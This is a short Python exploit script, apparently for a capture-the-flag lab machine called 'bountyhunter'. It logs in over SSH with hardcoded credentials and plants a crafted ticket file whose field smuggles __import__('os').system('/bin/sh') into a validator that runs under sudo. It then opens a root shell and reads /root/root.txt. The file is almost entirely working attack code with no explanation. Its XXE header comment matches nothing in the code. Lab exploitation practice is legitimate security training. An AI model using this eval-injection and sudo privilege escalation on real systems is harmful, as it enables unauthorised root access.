#!/usr/bin/python3

import requests
import urllib.parse
import base64
from pexpect import pxssh

#-------------------------------------XXE--------------------------------------
# https://portswigger.net/web-security/xxe

IP = '10.10.11.100'
hostname = IP
username = 'development'
password = 'm19RoAU0hP41A1sTsq6K'

# User development may run the following commands on bountyhunter:
#    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py


ticket = "# Skytrain Inc\n\
## Ticket to root\n\
__Ticket Code:__\n\
**4+1 == 5 and __import__('os').system('/bin/sh')"

try:
    s1 = pxssh.pxssh()
    s1.login(hostname, username, password)
    s1.sendline('echo -e "' + ticket + '" > /tmp/ticket.md')
    s1.prompt()
    [print(_) for _ in ''.join(map(chr, s1.before)).replace('\r', '').split('\n')]
    s1.sendline('sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py')
    s1.sendline('/tmp/ticket.md')
    s1.prompt(timeout=2)
    [print(_) for _ in ''.join(map(chr, s1.before)).replace('\r', '').split('\n')]
    s1.sendline('cat /root/root.txt')
    s1.prompt(timeout=2)
    [print(_) for _ in ''.join(map(chr, s1.before)).replace('\r', '').split('\n')]
    s1.sendline('exit')
    s1.logout()    
except pxssh.ExceptionPxssh as e:
    print("pxssh failed on login.")
    print(e)

